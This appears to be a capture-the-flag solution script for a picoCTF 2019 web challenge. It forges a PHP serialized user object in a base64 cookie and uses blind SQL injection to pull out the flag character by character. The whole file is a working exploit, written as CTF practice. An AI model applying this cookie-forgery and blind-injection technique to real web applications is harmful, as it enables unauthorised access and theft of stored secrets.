#!/usr/bin/env python
import base64
import requests
import string
import sys
from urllib.parse import urljoin


VERBOSE = 0


def trace(*args, **kwargs):
    if VERBOSE > 1: print(*args, file=sys.stderr, flush=True, **kwargs)


def solve(url='http://2019shell1.picoctf.com:62195'):

    def login(username, password):
        data = {'user': username, 'pass': password}
        r = requests.post(urljoin(url, '/index.php?file=login'), data=data)
        trace(r, r.url, r.headers)
        trace(r.text)

    def oracle(password):
        user = "admin' and password like 'picoCTF{__pass__%' or '2' = '2"
        user = user.replace('__pass__', password)
        tpl = 'O:8:"siteuser":2:{s:8:"username";s:__userlen__:"__user__";s:8:"password";s:5:"admin";}'
        user_info = tpl.replace('__userlen__', str(len(user))).replace('__user__', user)
        trace(user_info)
        user_info = base64.b64encode(user_info.encode('utf-8')).decode('ascii')
        cookies = dict(user_info=user_info)
        r = requests.get(urljoin(url, '/index.php?file=admin'), cookies=cookies)
        trace(r, r.url)
        trace(r.history)
        trace(r.text)
        return 'Welcome to' in r.text

    abc = string.ascii_lowercase + string.digits + '}'
    password = ''
    while not password.endswith('}'):
        trace(password)
        for x in abc:
            trace(password + x)
            if oracle(password + x):
                password += x
                break
        else:
            return 'poop'

    flag = 'picoCTF{' + password
    # login('admin', flag)
    return flag


if __name__ == '__main__':
    print(solve(*sys.argv[1:]))
